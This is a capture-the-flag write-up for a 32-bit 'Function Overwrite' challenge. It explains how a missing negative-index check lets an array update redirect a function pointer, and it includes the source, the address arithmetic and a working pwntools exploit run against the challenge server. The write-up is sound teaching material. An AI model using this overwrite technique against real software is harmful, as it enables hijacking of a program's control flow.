# CyLab — Function Overwrite

* **Platform:** CyLab Security Academy / picoCTF (Challenge ID: `272`)
* **Category:** Binary Exploitation / Out-of-Bounds (OOB) Arithmetic (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, objdump
* **Binary:** `vuln` (32-bit x86 ELF)

---

## TL;DR

The binary validates a user-provided story string against a mathematical scoring condition using a global function pointer `check`, initially pointing to `hard_checker` (which requires an unreachable sum of $13{,}371{,}337$). Before invoking `check`, the program allows updating a global integer array `fun[10]` with `fun[num1] += num2`. While the program verifies `num1 < 10`, it fails to check for negative indices (`num1 >= 0`). Using index `num1 = -11` targets the function pointer `check` in the preceding data segment. By providing `num2 = easy_checker - hard_checker = -310`, `check` is redirected to `easy_checker`, which accepts a score of $1{,}337$. Crafting a story string with ASCII sum $1{,}337$ reveals the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
1. **No PIE:** Fixed base addresses at `0x08048000`. Global symbols and functions are at static addresses.
2. **Missing Negative Index Check:** The array bounds check only enforces an upper bound.
3. **Target Function Available:** `easy_checker` evaluates user input for a byte sum of $1{,}337$ and outputs `flag.txt`.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void (*check)(char*, size_t) = hard_checker;   // Located in .data at 0x0804c034
int fun[10];                                   // Located in .bss at 0x0804c060

void easy_checker(char *story, size_t len) {
    int score = 0;
    for (size_t i = 0; i < len; i++) {
        score += (unsigned char)story[i];
    }
    if (score == 1337) {
        printf("You win! Flag: ");
        // Reads and displays flag.txt
    }
}

void hard_checker(char *story, size_t len) {
    int score = 0;
    for (size_t i = 0; i < len; i++) {
        score += (unsigned char)story[i];
    }
    if (score == 13371337) {
        // Unreachable: Maximum 127 bytes * 255 = 32,385 << 13371337
        printf("Flag: ...");
    }
}

void vuln() {
    char story[128];
    int num1, num2;

    printf("Tell me a story: ");
    scanf("%127s", story);

    printf("Give me two numbers: ");
    scanf("%d %d", &num1, &num2);

    // VULNERABILITY: Signed comparison allows negative indices
    if (num1 < 10) {
        fun[num1] += num2;
    }

    check(story, strlen(story));
}
```

### 2. Global Memory Layout & Delta Calculation

Inspecting symbol addresses via `objdump -t vuln` or GDB:

```text
0x0804c034: check         (Function pointer, default = 0x0804936e <hard_checker>)
0x0804c060: fun           (int[10] array, 40 bytes)
0x08049238: easy_checker  (Target function)
0x0804936e: hard_checker  (Current function)
```

Offset calculation:
$$\text{Memory Distance} = \text{address}(\text{check}) - \text{address}(\text{fun}) = 0\text{x}0804c034 - 0\text{x}0804c060 = -44 \text{ bytes}$$

Since each array element in `int fun[]` is 4 bytes:
$$\text{Index } (\text{num1}) = \frac{-44}{4} = -11$$

Arithmetic delta for `num2`:
$$\text{Delta } (\text{num2}) = \text{address}(\text{easy\_checker}) - \text{address}(\text{hard\_checker})$$
$$\text{num2} = 0\text{x}08049238 - 0\text{x}0804936e = -0\text{x}136 = -310$$

```text
       0x0804c034: check pointer (hard_checker = 0x0804936e)
                   +---------------------------------------+
                   |  fun[-11] += (-310)                   |
                   +---------------------------------------+
                   New Value = 0x08049238 (easy_checker)
                   
       0x0804c060: fun[0]
       0x0804c064: fun[1]
                   ...
```

---

## Dynamic Analysis & Exploitation Strategy

1. **Crafting Story String for `easy_checker`:**
   We require $\sum \text{ASCII}(\text{story}_i) = 1337$.
   $$20 \times 65 \,(\text{'A'}) = 1300$$
   $$1337 - 1300 = 37 \,(\text{'\%'})$$
   String: `b"A" * 20 + b"%"` (21 characters, total sum = 1337).
2. **Submitting Numbers:**
   When prompted for two numbers, send `-11 -310`.
3. **Execution:**
   - `fun[-11] += -310` updates `check` to point to `easy_checker`.
   - `check(story, len)` invokes `easy_checker(story, 21)`.
   - `easy_checker` validates that `score == 1337` and prints the flag.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, sys
from pwn import *

context.log_level = "info"
HOST, PORT = "chatelaine.cylabacademy.net", 36357

def solve(io):
    # Story string whose ASCII values sum to 1337
    # 20 * ord('A') + ord('%') = 20 * 65 + 37 = 1337
    story = b"A" * 20 + b"%"

    io.recvuntil(b"Tell me a story: ")
    io.sendline(story)

    # num1 = -11 to target check pointer; num2 = -310 to shift hard_checker to easy_checker
    io.recvuntil(b"Give me two numbers: ")
    io.sendline(b"-11 -310")

    data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./vuln") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 36357: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 36357
```

---

## Key Takeaways & Lessons

1. **Signed vs. Unsigned Boundary Checks:** Checking only `index < MAX` with a signed integer permits negative indexing into memory preceding the buffer. Compilers emit signed jump instructions (`jl`/`jle`), allowing negative values unless `unsigned` types or `index >= 0` checks are enforced.
2. **Relative Memory Arithmetic Primitives:** Even without arbitrary write, an additive operation (`arr[i] += val`) is sufficient to redirect function pointers by adding the signed difference between the desired target and the current value.
3. **Exploiting Static Data Segment Adjacency:** In non-PIE binaries, the relative distances between variables in `.data` and `.bss` are fixed at compile time, enabling deterministic indexing without runtime memory disclosures.
